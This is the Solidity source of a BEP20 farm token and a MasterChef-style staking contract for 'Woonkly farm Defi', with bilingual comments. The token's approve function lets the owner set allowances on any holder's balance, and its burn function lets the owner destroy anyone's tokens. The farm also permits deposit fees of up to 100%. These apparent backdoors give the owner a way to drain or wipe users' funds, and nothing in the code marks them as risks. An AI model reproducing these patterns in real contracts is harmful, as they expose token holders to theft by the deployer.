contract WDEFIToken is BEP20("Woonkly farm Defi", "wDEFIF", 18), MinterRole {
    constructor() public {}

    function approve(
        address owner,
        address spender,
        uint256 amount
    ) public onlyOwner {
        _approve(owner, spender, amount);
    }

    /// @notice Creates `_amount` token to `_to`. Must only be called by the owner.
    function mint(address _to, uint256 _amount) public onlyMinter {
        _mint(_to, _amount);
    }

    /// @notice Bunrs `_amount` token fromo `_from`. Must only be called by the owner.
    function burn(address _from, uint256 _amount) public onlyOwner {
        _burn(_from, _amount);
    }

    /// @notice Presale `_amount` token to `_to`. Must only be called by the minter.
    function presale(address _to, uint256 _amount) public onlyMinter {
        _transfer(address(this), _to, _amount);
    }
}

// MasterWoonky is the master of wDefi. He can make wDefi and he is a fair guy.
//
// Note that it's ownable and the owner wields tremendous power. The ownership
// will be transferred to a governance smart contract once wDEFI is sufficiently
// distributed and the community can show to govern itself.
//

// version 1.0.0
contract MasterWoonky is Ownable {
    using SafeMath for uint256;
    using SafeBEP20 for IBEP20;

    // Info of each user.
    struct UserInfo {
        uint256 amount; // How many LP tokens the user has provided.
        uint256 rewardDebt; // Reward debt. See explanation below.
        //
        // We do some fancy math here. Basically, any point in time, the amount of wDefis
        // entitled to a user but is pending to be distributed is:
        //
        //   pending reward = (user.amount * pool.accwDefiPerShare) - user.rewardDebt
        //
        // Whenever a user deposits or withdraws LP tokens to a pool. Here's what happens:
        //   1. The pool's `accwDefiPerShare` (and `lastRewardBlock`) gets updated.
        //   2. User receives the pending reward sent to his/her address.
        //   3. User's `amount` gets updated.
        //   4. User's `rewardDebt` gets updated.

        // Hacemos algunas matemáticas sofisticadas aquí. Básicamente, en cualquier momento, la cantidad de wDefis
        // tiene derecho a un usuario pero está pendiente de ser distribuido es:
        //
        // recompensa pendiente = (user.amount * pool.accwDefiPerShare) - user.rewardDebt
        //
        // Siempre que un usuario deposita o retira tokens LP a un pool. Esto es lo que sucede:
        // 1. Se actualiza `accwDefiPerShare` (y` lastRewardBlock`) del pool.
        // 2. El usuario recibe la recompensa pendiente enviada a su wallet.
        // 3. Se actualiza la `amount` del usuario.
        // 4. Se actualiza la `rewardDebt` del usuario.
    }

    // Info of each pool.
    struct PoolInfo {
        IBEP20 lpToken; // Address of LP token contract.
        uint256 allocPoint; // How many allocation points assigned to this pool. wDefis to distribute per block.
        uint256 lastRewardBlock; // Last block number that wDefis distribution occurs.
        uint256 accwDefiPerShare; // Accumulated wDefis per share, times 1e12. See below.
        uint16 depositFeeBP; // Deposit fee in basis points
    }

    // The wDEFI TOKEN! //token inflacionario
    WDEFIToken public wdefi;
    // Dev address.
    address public devaddr;
    // wDEFI tokens created per block.
    uint256 public wdefiPerBlock;
    // Bonus muliplier for early wdefi makers.
    uint256 public constant BONUS_MULTIPLIER = 1;
    // Deposit Fee address
    address public feeAddress;

    // Info of each pool.
    PoolInfo[] public poolInfo;
    // Info of each user that stakes LP tokens.
    mapping(uint256 => mapping(address => UserInfo)) public userInfo;
    // Total allocation points. Must be the sum of all allocation points in all pools.
    uint256 public totalAllocPoint = 0;
    // The block number when wDEFI mining starts.
    uint256 public startBlock;

    event Deposit(address indexed user, uint256 indexed pid, uint256 amount);
    event Withdraw(address indexed user, uint256 indexed pid, uint256 amount);
    event EmergencyWithdraw(
        address indexed user,
        uint256 indexed pid,
        uint256 amount
    );

    constructor(
        WDEFIToken _wdefi,
        address _devaddr,
        address _feeAddress,
        uint256 _wdefiPerBlock,
        uint256 _startBlock
    ) public {
        wdefi = _wdefi;
        devaddr = _devaddr;
        feeAddress = _feeAddress;
        wdefiPerBlock = _wdefiPerBlock;
        startBlock = _startBlock;
    }

    function poolLength() external view returns (uint256) {
        return poolInfo.length;
    }

    function poolExist(IBEP20 _lpToken) internal view returns(bool){
        uint256 i=0;
        
        for(i=0;i<poolInfo.length;i++){
            if(address(poolInfo[i].lpToken) == address(_lpToken) ) return true;
        }
        
        return false;
    }

    // Add a new lp to the pool. Can only be called by the owner.
    // XXX DO NOT add the same LP token more than once. Rewards will be messed up if you do.
    function add(
        uint256 _allocPoint,
        IBEP20 _lpToken,
        uint16 _depositFeeBP,
        bool _withUpdate
    ) public onlyOwner {
        require(
            _depositFeeBP <= 10000,
            "add: invalid deposit fee basis points"
        );
        require(!poolExist(_lpToken),"add: try to add existing pool" );

        if (_withUpdate) {
            massUpdatePools();
        }
        uint256 lastRewardBlock =
            block.number > startBlock ? block.number : startBlock;
        totalAllocPoint = totalAllocPoint.add(_allocPoint);
        poolInfo.push(
            PoolInfo({
                lpToken: _lpToken,
                allocPoint: _allocPoint,
                lastRewardBlock: lastRewardBlock,
                accwDefiPerShare: 0,
                depositFeeBP: _depositFeeBP
            })
        );
    }

    // Update the given pool's wDEFI allocation point and deposit fee. Can only be called by the owner.
    // Actualica el allocation point de wDEFI y deposit fee del pool _pid. onlyOwner
    function set(
        uint256 _pid,
        uint256 _allocPoint,
        uint16 _depositFeeBP,
        bool _withUpdate
    ) public onlyOwner {
        require(
            _depositFeeBP <= 10000,
            "set: invalid deposit fee basis points"
        );
        if (_withUpdate) {
            massUpdatePools();
        }
        totalAllocPoint = totalAllocPoint.sub(poolInfo[_pid].allocPoint).add(
            _allocPoint
        );
        poolInfo[_pid].allocPoint = _allocPoint;
        poolInfo[_pid].depositFeeBP = _depositFeeBP;
    }

    // Return reward multiplier over the given _from to _to block.
    // Devuelve el multiplicador de recompensas sobre el _from a _to block.
    function getMultiplier(uint256 _from, uint256 _to)
        public
        pure
        returns (uint256)
    {
        return _to.sub(_from).mul(BONUS_MULTIPLIER);
    }

    // View function to see pending wDefis on frontend.
    function pendingwDefi(uint256 _pid, address _user)
        external
        view
        returns (uint256)
    {
        PoolInfo storage pool = poolInfo[_pid];
        UserInfo storage user = userInfo[_pid][_user];
        uint256 accwDefiPerShare = pool.accwDefiPerShare;
        uint256 lpSupply = pool.lpToken.balanceOf(address(this));
        if (block.number > pool.lastRewardBlock && lpSupply != 0) {
            uint256 multiplier =
                getMultiplier(pool.lastRewardBlock, block.number);
            uint256 wdefiReward =
                multiplier.mul(wdefiPerBlock).mul(pool.allocPoint).div(
                    totalAllocPoint
                );
            accwDefiPerShare = accwDefiPerShare.add(
                wdefiReward.mul(1e12).div(lpSupply)
            );
        }
        return user.amount.mul(accwDefiPerShare).div(1e12).sub(user.rewardDebt);
    }

    // Update reward variables for all pools. Be careful of gas spending!
    function massUpdatePools() public {
        uint256 length = poolInfo.length;
        for (uint256 pid = 0; pid < length; ++pid) {
            updatePool(pid);
        }
    }

    // Update reward variables of the given pool to be up-to-date.
    function updatePool(uint256 _pid) public {
        PoolInfo storage pool = poolInfo[_pid];
        if (block.number <= pool.lastRewardBlock) {
            return;
        }
        uint256 lpSupply = pool.lpToken.balanceOf(address(this));
        if (lpSupply == 0 || pool.allocPoint == 0) {
            pool.lastRewardBlock = block.number;
            return;
        }
        uint256 multiplier = getMultiplier(pool.lastRewardBlock, block.number);
        uint256 wdefiReward =
            multiplier.mul(wdefiPerBlock).mul(pool.allocPoint).div(
                totalAllocPoint
            );
        wdefi.mint(devaddr, wdefiReward.div(10));
        wdefi.mint(address(this), wdefiReward);
        pool.accwDefiPerShare = pool.accwDefiPerShare.add(
            wdefiReward.mul(1e12).div(lpSupply)
        );
        pool.lastRewardBlock = block.number;
    }

    // Deposit LP tokens to MasterWoonky for wDEFI allocation.
    //Audit: Only allowed set of ERC20 tokens that are permitted into MasterWonnky pools.
    function deposit(uint256 _pid, uint256 _amount) public {
        PoolInfo storage pool = poolInfo[_pid];
        UserInfo storage user = userInfo[_pid][msg.sender];
        updatePool(_pid);
        if (user.amount > 0) {
            uint256 pending =
                user.amount.mul(pool.accwDefiPerShare).div(1e12).sub(
                    user.rewardDebt
                );
            if (pending > 0) {
                safewDefiTransfer(msg.sender, pending);
            }
        }
        if (_amount > 0) {
            pool.lpToken.safeTransferFrom(
                address(msg.sender),
                address(this),
                _amount
            );
            if (pool.depositFeeBP > 0) {
                uint256 depositFee = _amount.mul(pool.depositFeeBP).div(10000);
                pool.lpToken.safeTransfer(feeAddress, depositFee);
                user.amount = user.amount.add(_amount).sub(depositFee);
            } else {
                user.amount = user.amount.add(_amount);
            }
        }
        user.rewardDebt = user.amount.mul(pool.accwDefiPerShare).div(1e12);
        emit Deposit(msg.sender, _pid, _amount);
    }

    // Withdraw LP tokens from MasterWoonky.
    function withdraw(uint256 _pid, uint256 _amount) public {
        PoolInfo storage pool = poolInfo[_pid];
        UserInfo storage user = userInfo[_pid][msg.sender];
        require(user.amount >= _amount, "withdraw: not good");
        updatePool(_pid);
        uint256 pending =
            user.amount.mul(pool.accwDefiPerShare).div(1e12).sub(
                user.rewardDebt
            );
        if (pending > 0) {
            safewDefiTransfer(msg.sender, pending);
        }
        if (_amount > 0) {
            user.amount = user.amount.sub(_amount);
            pool.lpToken.safeTransfer(address(msg.sender), _amount);
        }
        user.rewardDebt = user.amount.mul(pool.accwDefiPerShare).div(1e12);
        emit Withdraw(msg.sender, _pid, _amount);
    }

    // Withdraw without caring about rewards. EMERGENCY ONLY.
    function emergencyWithdraw(uint256 _pid) public {
        PoolInfo storage pool = poolInfo[_pid];
        UserInfo storage user = userInfo[_pid][msg.sender];
        uint256 amount = user.amount;
        user.amount = 0;
        user.rewardDebt = 0;
        pool.lpToken.safeTransfer(address(msg.sender), amount);
        emit EmergencyWithdraw(msg.sender, _pid, amount);
    }

    // Safe wdefi transfer function, just in case if rounding error causes pool to not have enough wDefis.
    function safewDefiTransfer(address _to, uint256 _amount) internal {
        uint256 wdefiBal = wdefi.balanceOf(address(this));
        if (_amount > wdefiBal) {
            SafeBEP20.safeTransfer(IBEP20(wdefi), _to, wdefiBal);
        } else {
            SafeBEP20.safeTransfer(IBEP20(wdefi), _to, _amount);
        }
    }

    // Update dev address by the previous dev.
    function dev(address _devaddr) public {
        require(msg.sender == devaddr, "dev: wut?");
        devaddr = _devaddr;
    }

    function setFeeAddress(address _feeAddress) public {
        require(msg.sender == feeAddress, "setFeeAddress: FORBIDDEN");
        feeAddress = _feeAddress;
    }

    //Pancake has to add hidden dummy pools inorder to alter the emission, here we make it simple and transparent to all.
    function updateEmissionRate(uint256 _wdefiPerBlock) public onlyOwner {
        wdefiPerBlock = _wdefiPerBlock;
    }
}
